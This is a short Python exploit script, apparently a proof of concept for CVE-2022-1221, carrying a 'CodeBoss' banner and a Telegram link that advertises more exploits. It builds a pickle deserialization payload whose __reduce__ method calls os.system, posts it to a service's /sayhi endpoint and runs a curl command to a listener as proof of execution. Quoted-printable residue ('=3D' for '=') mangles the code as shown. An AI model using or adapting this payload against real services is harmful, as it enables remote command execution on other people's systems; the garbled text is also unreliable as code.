
import requests
import pickle


def CodeBoss():
    print('''
   ______          __     ____                 
  / ____/___  ____/ /__  / __ )____  __________
 / /   / __ \/ __  / _ \/ __  / __ \/ ___/ ___/
/ /___/ /_/ / /_/ /  __/ /_/ / /_/ (__  |__  ) 
\____/\____/\__,_/\___/_____/\____/____/____/  
    CVE-2022-1221 - CWE-901
    
    For More Famous Tools And Exploit Join Here 
     t.me/codeboss503                                             
    ''')   

HOST =3D "127.0.0.1:65432"
URL =3D f"http://{HOST}/sayhi"
HEADERS =3D {
    "serializer": "pickle"
}


def generate_payload(cmd):

    class PickleRce(object):
        def __reduce__(self):
            import os
            return os.system, (cmd,)

    payload =3D pickle.dumps(PickleRce())
    print(payload)
    return payload

def exec_command(cmd):
    payload =3D generate_payload(cmd)
    requests.post(url=3DURL, data=3Dpayload, headers=3DHEADERS)

def main():
    exec_command('curl http://127.0.0.1:4321')

if __name__ =3D=3D "__main__":
    main()
            
